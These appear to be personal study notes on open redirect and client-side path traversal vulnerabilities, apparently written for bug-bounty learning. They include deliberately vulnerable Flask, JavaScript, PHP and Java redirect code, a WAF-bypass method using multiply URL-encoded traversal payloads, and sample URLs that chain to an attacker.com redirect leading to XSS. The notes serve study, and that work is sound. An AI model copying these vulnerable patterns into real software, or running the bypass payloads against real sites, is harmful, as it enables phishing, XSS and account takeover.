# Open Redirect
## examples
### header based (= serverside redirect):
- Generally, server-side redirects always make use of the **Location** HTTP response header along with a <mark style="background: #BBFABBA6;">3XX HTTP status code</mark> (such as 301, 302 or 307)
```python
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route("/")
def page():
    next = request.values.get('next')
    if next:
    	return redirect(next)
    else:
    	return 'Hi :)'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```
###  JS based(= client side redirect):
- no **Location** header change 
- generally small delay 
```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Redirector</title>
	<script type="text/javascript">
		if(window.location.hash) {
			var hash = window.location.hash.substring(1); //Puts hash in variable, and removes the # character
			window.location = hash
			// hash found
		}
	</script>
</head>
<body>
<h1>Hello :-)</h1>
</body>
</html>
```
### checker function 
```php
<?php
function check_hmac($url, $hmac){
	return ($hmac == md5($url));
}

if (isset($_GET['url']) && isset($_GET['h'])) {
	if (check_hmac($_GET['url'], $_GET['h'])) header('Location: ' . $_GET['url']);
	else echo 'Invalid HMAC';
}

?>
<pre>
<a href="?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f">Google.com</a>
```
### Vulnerable code 
opening [the link](https://github.com/julz0815/mtech-training/blob/4a0d8fcec1d3883f140221cb8580a093ad277934/src/main/java/com/veracode/verademo/controller/UserController.java#L82) shows to the vulnerable code, the `/?target=` is vulnerable to Open Redirect ( RequestParam is an [annotation to extract query parameters](https://www.baeldung.com/spring-request-param)):
```java
@RequestMapping(value = "/login", method = RequestMethod.GET)
	public String showLogin(
			@RequestParam(value = "target", required = false) String target,
			@RequestParam(value = "username", required = false) String username,
			Model model,
			HttpServletRequest httpRequest,
			HttpServletResponse httpResponse)
	{
		// Check if user is already logged in
		if (httpRequest.getSession().getAttribute("username") != null) {
			logger.info("User is already logged in - redirecting...");
			if (target != null && !target.isEmpty() && !target.equals("null")) {
				return "redirect:" + target;
			}
			else {
				// default to user's feed
				return "redirect:feed";
			}
		}

		User user = UserFactory.createFromRequest(httpRequest);
		if (user != null) {
			httpRequest.getSession().setAttribute("username", user.getUserName());
			logger.info("User is remembered - redirecting...");
			if (target != null && !target.isEmpty() && !target.equals("null")) {
				return "redirect:" + target;
			}
			else {
				// default to user's feed
				return "redirect:feed";
			}
		}
		else {
			logger.info("User is not remembered");
		}

		if (username == null) {
			username = "";
		}

		if (target == null) {
			target = "";
		}

		logger.info("Entering showLogin with username " + username + " and target " + target);

		model.addAttribute("username", username);
		model.addAttribute("target", target);
		return "login";
	}
```

# CSPT (client side path traversal)

- occurs when attacker-controlled input which is not properly encoded lands in the [path component](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL#basics_anatomy_of_a_url) of a URL, which the **JavaScript code of an application** sends a request to
	- an attacker can inject path traversal sequences (`../`) to the path of the URL , making the JS code send a request to an arbitrary endpoint
- [ ] attacker-controlled input coming from where ? 
	- [ ] ==query param== `https://example.com/viewpost?p=../../../asdf`
	- [ ] ==path param ==(coomon in REST) `https://example.com/viewpost/543`
		- [ ] as for the exploit, WAF may block you (e.g `https://example.com/viewpost/..%2f..%2f..%2fredirect%3fu=https:%2f%2fattacker.com`) -> similarity to serverside path traversal) 
- [ ] chaining CSPT with open redirect senario - query based input ![[Pasted image 20260216132553.png]]
	- A post-serving page calls the `fetch` function, sending a request to a URL with attacker-controlled input which is not properly encoded in its path, allowing the attacker to inject `../` sequences to the path and make the request get sent to an arbitrary endpoint. This behavior is refered to as a CSPT vulnerability.
	- The attacker makes the request get sent to an endpoint which contains an open redirect vulnerability.
	- The endpoint responds with a redirect to an attacker-controlled domain.
	- This `fetch` function automatically follows this redirect, sending a request to the attacker-controlled domain.
	- The attacker-controlled domain responds with some malicious response.
	- The `fetch` function finishes and returns the malicious response.
	- The page treats that response as if it was the content of a blog post, leading to XSS.
### waf bypass methodology for path traversal
- [ ] determine :
	- [ ]  **depth** (equal to the number of directories in its path, minus the number of `../` sequences in it)
	- [ ] **encoding level** (the number of times you have to repeatedly URL-decode it in order to properly decode the string) (`b%252561 -> b%2561 -> b%61 -> ba` => 4) 
	- [ ] **WAF's level** (In order to prevent path traversal attacks that use higher encoding levels, the WAF decoded the URL a certain number of times before checking its depth)
	- [ ] **app's level** (the application decodes our input a certain number of times before passing it to the `fetch` function)
> [!note] have in mind: The browser treats `%2e%2e/` sequences exactly the same as `../` sequences, even though the dots in the first sequence are encoded.
- [ ] If the the WAF's level is **smaller than** the app's level
	- [ ] encode our payload repeatedly until the WAF doesn't block the request anymore
> [!example] if the WAF's level is 1 and the app's level is 2 =>  `..%252f..%252f..%252fasdf`
> 	 WAF wouldn't recognize the `../` sequences, but the application would decode the payload twice before passing it to the `fetch` function as `../../../asdf` so it would work

- [ ] If the the WAF's level is **greater than** the app's level
	- [ ] we include many encoded `a/a` sequences in the path that the WAF would decode but the application wouldn't
> [!example] if the WAF's level is 2 and the app's level is 1 => `a%252fa%252fa%252fa%2f..%2f..%2f..%2f..%2fasdf`
> 	The WAF would decode this payload to `a/a/a/a/../../../../asdf`, so the depth would be 0 (4 directories minus 4 `../` sequences). However, the payload would be passed to the fetch function as `a%2fa%2fa%2fa/../../../../asdf`, which is equivalent to `../../../asdf`, so it would work

- [ ] if the the WAF's level is **equal to** the app's level
	- [ ] we use a payload that would get decoded by both the browser and the WAF
> [!example] both 3 level => `%2e%2e/%2e%2e/%2e%2e/asdf`
> 	For the WAF, this payload would have a depth of 3. However, because the browser treats `%2e%2e/` sequences exactly the same as `../` sequences, they payload would actually work!
-  another example for same level CSPT: ![[Pasted image 20260216152207.png]]
	- The URL which I used was similar to `https://example.com/viewpost/%252e%252e%2f%252e%252e%2f%252e%252e%2fredirect%3fu=https:%2f%2fattacker.com`. The WAF and the browser decoded this URL to `https://example.com/viewpost/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com` which has a positive depth, so the request wasn't blocked. The app decoded the payload once, and URL which got passed to fetch was `https://example.com/api/posts/get_content/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com`, which is equivalent to `https://example.com/redirect?u=https://attacker.com`
## Chains 

**• [CSPT & File Upload Bypasses ](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**
**• [CSPT Reports & Techniques ](https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1)**
**• [Automating CSPT Discovery ](https://vitorfalcao.com/posts/automating-cspt-discovery/)**
**• [Saving CSRF with CSPT ](https://netragard.com/saving-csrf-client-side-path-traversal-to-the-rescue/)**
**• [The Power of CSPT  ](https://medium.com/@Nightbloodz/the-power-of-client-side-path-traversal-how-i-found-and-escalated-2-bugs-through-670338afc90f)**
**• [Fetch Diversion ](https://acut3.net/posts/2023-01-03-fetch-diversion/)**
**•[ CSTP Attacks ](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html)**
**• [CSPT → Open Redirect → XSS](https://x.com/samwcyo/status/1437030056627523590)**
**• [CSPT → JSONP → XSS](https://x.com/HusseiN98D/status/1809164551822172616)**
**• [CSPT → JSONP → XSS](https://x.com/isira_adithya/status/1809228815002136719)**
**• [CSPT → XSS](https://x.com/RonMasas/status/1759603359646974386)**
**• [CSTP → ATO](https://kapytein.nl/security/web/2023/12/17/from-an-innocent-client-side-path-traversal-to-account-takeover/)**
